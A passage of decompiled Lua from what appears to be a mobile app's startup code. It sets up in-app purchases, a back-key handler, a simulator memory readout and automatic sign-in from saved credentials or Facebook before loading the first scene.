    L1_3.app_token = L2_3
    L0_3(L1_3)
    L0_3 = require
    L1_3 = "activity.libActivity"
    L0_3(L1_3)
    L0_3 = libActivity
    L0_3 = L0_3.init
    L1_3 = {}
    L1_3.AppId = 16
    L0_3(L1_3)
    L0_3 = require
    L1_3 = "libraries.libInapp"
    L0_3(L1_3)
    L0_3 = libInapp
    L0_3 = L0_3.init
    L0_3()
    L0_3 = true
    _isInAppPurchase = L0_3
    L0_3 = _Platform
    if L0_3 ~= "tvos" then
      L0_3 = _Platform
      if L0_3 ~= "winphone" then
        goto lbl_191
      end
    end
    L0_3 = false
    _isInAppPurchase = L0_3
    ::lbl_191::
    L0_3 = require
    L1_3 = "scripts.require"
    L0_3(L1_3)
    L0_3 = "escape"
    _exitKey = L0_3
    L0_3 = _Platform
    if L0_3 ~= "ios" then
      L0_3 = Runtime
      L1_3 = L0_3
      L0_3 = L0_3.addEventListener
      L2_3 = "key"
      function L3_3(A0_4)
        local L1_4, L2_4, L3_4, L4_4, L5_4, L6_4
        L1_4 = A0_4.keyName
        L2_4 = _exitKey
        if L1_4 ~= L2_4 then
          L1_4 = A0_4.keyName
          if L1_4 ~= "back" then
            goto lbl_79
          end
        end
        L1_4 = A0_4.phase
        if L1_4 == "down" then
          L1_4 = global
          if L1_4 then
            L1_4 = global
            L1_4 = L1_4.isShowScene
            if L1_4 then
              L1_4 = AdsManager
              L1_4 = L1_4.isShow
              if not L1_4 then
                L1_4 = Key_board
                if L1_4 then
                  L1_4 = Key_board
                  L1_4 = L1_4.isShow
                  if L1_4 then
                    L1_4 = Key_board
                    L2_4 = L1_4
                    L1_4 = L1_4.hide
                    L1_4(L2_4)
                end
                else
                  L1_4 = Control
                  if L1_4 then
                    L1_4 = Control
                    L1_4 = L1_4.backPressed
                    if L1_4 then
                      L1_4 = Control
                      L2_4 = L1_4
                      L1_4 = L1_4.backPressed
                      L1_4 = L1_4(L2_4)
                      if L1_4 then
                    end
                  end
                  else
                    L1_4 = composer
                    L1_4 = L1_4.getScene
                    L2_4 = composer
                    L2_4 = L2_4.getSceneName
                    L3_4 = "overlay"
                    L2_4, L3_4, L4_4, L5_4, L6_4 = L2_4(L3_4)
                    L1_4 = L1_4(L2_4, L3_4, L4_4, L5_4, L6_4)
                    L2_4 = composer
                    L2_4 = L2_4.getScene
                    L3_4 = composer
                    L3_4 = L3_4.getSceneName
                    L4_4 = "current"
                    L3_4, L4_4, L5_4, L6_4 = L3_4(L4_4)
                    L2_4 = L2_4(L3_4, L4_4, L5_4, L6_4)
                    if L1_4 then
                      L4_4 = L1_4
                      L3_4 = L1_4.backPressed
                      L5_4 = {}
                      L6_4 = A0_4.keyName
                      L5_4.keyName = L6_4
                      return L3_4(L4_4, L5_4)
                    elseif L2_4 then
                      L4_4 = L2_4
                      L3_4 = L2_4.backPressed
                      L5_4 = {}
                      L6_4 = A0_4.keyName
                      L5_4.keyName = L6_4
                      return L3_4(L4_4, L5_4)
                    end
                  end
                end
              end
            end
          end
          L1_4 = true
          return L1_4
        end
        ::lbl_79::
      end
      L0_3(L1_3, L2_3, L3_3)
    end
    function L0_3()
      local L0_4, L1_4, L2_4, L3_4, L4_4, L5_4, L6_4, L7_4
      L0_4 = system
      L0_4 = L0_4.getInfo
      L1_4 = "environment"
      L0_4 = L0_4(L1_4)
      if L0_4 == "simulator" then
        L0_4 = nil
        L1_4 = nil
        L2_4 = display
        L2_4 = L2_4.newText
        L3_4 = ""
        L4_4 = 0
        L5_4 = 0
        L6_4 = nil
        L7_4 = 15
        L2_4 = L2_4(L3_4, L4_4, L5_4, L6_4, L7_4)
        L0_4 = L2_4
        L3_4 = L0_4
        L2_4 = L0_4.setFillColor
        L4_4 = 1
        L5_4 = 0
        L6_4 = 0
        L2_4(L3_4, L4_4, L5_4, L6_4)
        L0_4.anchorX = 0
        L0_4.x = 10
        L0_4.y = 10
        L3_4 = L0_4
        L2_4 = L0_4.toFront
        L2_4(L3_4)
        L2_4 = display
        L2_4 = L2_4.newText
        L3_4 = ""
        L4_4 = 0
        L5_4 = 0
        L6_4 = nil
        L7_4 = 15
        L2_4 = L2_4(L3_4, L4_4, L5_4, L6_4, L7_4)
        L1_4 = L2_4
        L3_4 = L1_4
        L2_4 = L1_4.setFillColor
        L4_4 = 1
        L5_4 = 0
        L6_4 = 0
        L2_4(L3_4, L4_4, L5_4, L6_4)
        L1_4.anchorX = 0
        L1_4.x = 10
        L1_4.y = 30
        L3_4 = L1_4
        L2_4 = L1_4.toFront
        L2_4(L3_4)
        function L2_4()
          local L0_5, L1_5, L2_5, L3_5
          L0_5 = collectgarbage
          L0_5()
          L0_5 = "MemUsage:  "
          L1_5 = collectgarbage
          L2_5 = "count"
          L1_5 = L1_5(L2_5)
          L0_5 = L0_5 .. L1_5
          L1_5 = "TexMem:       "
          L2_5 = system
          L2_5 = L2_5.getInfo
          L3_5 = "textureMemoryUsed"
          L2_5 = L2_5(L3_5)
          L2_5 = L2_5 / 1000000
          L1_5 = L1_5 .. L2_5
          L2_5 = L0_4
          if L2_5 then
            L2_5 = L0_4
            L2_5.text = L0_5
          end
          L2_5 = L1_4
          if L2_5 then
            L2_5 = L1_4
            L2_5.text = L1_5
          end
        end
        L3_4 = Runtime
        L4_4 = L3_4
        L3_4 = L3_4.addEventListener
        L5_4 = "enterFrame"
        L6_4 = L2_4
        L3_4(L4_4, L5_4, L6_4)
      end
    end
    L1_3 = Function
    L1_3 = L1_3.load_data_state
    L1_3()
    L1_3 = global
    L1_3 = L1_3.DataApp
    L1_3 = L1_3.User
    L1_3 = L1_3.UserId
    if L1_3 then
      L1_3 = global
      L1_3 = L1_3.DataApp
      L1_3 = L1_3.User
      L1_3 = L1_3.Pwd
      if L1_3 then
        L1_3 = Function
        L1_3 = L1_3.insertUser
        L2_3 = {}
        L3_3 = global
        L3_3 = L3_3.DataApp
        L3_3 = L3_3.User
        L3_3 = L3_3.UserName
        L2_3.UserName = L3_3
        L3_3 = global
        L3_3 = L3_3.DataApp
        L3_3 = L3_3.User
        L3_3 = L3_3.Pwd
        L2_3.Pwd = L3_3
        L2_3.type = "signin"
        L1_3(L2_3)
    end
    else
      L1_3 = CustomFacebook
      L1_3 = L1_3.login
      L2_3 = "auto"
      L1_3(L2_3)
    end
    L1_3 = L1_2
    if L1_3 then
      L1_3 = L1_2
      L1_3 = L1_3.isAcceptPolicy
      if not L1_3 then
        L1_3 = iOrientation
        if L1_3 then
          L1_3 = iOrientation
          L1_3 = L1_3.setRequestedOrientation
          L2_3 = global
          L2_3 = L2_3.setting
          L2_3 = L2_3.orientation
          L1_3(L2_3)
        end
      end
    end
    L1_3 = composer
    L1_3 = L1_3.gotoScene
    L2_3 = "scripts.load"
    L1_3(L2_3)
  end
  L2_2(L3_2, L4_2)
end
L6_1(L7_1, L8_1)
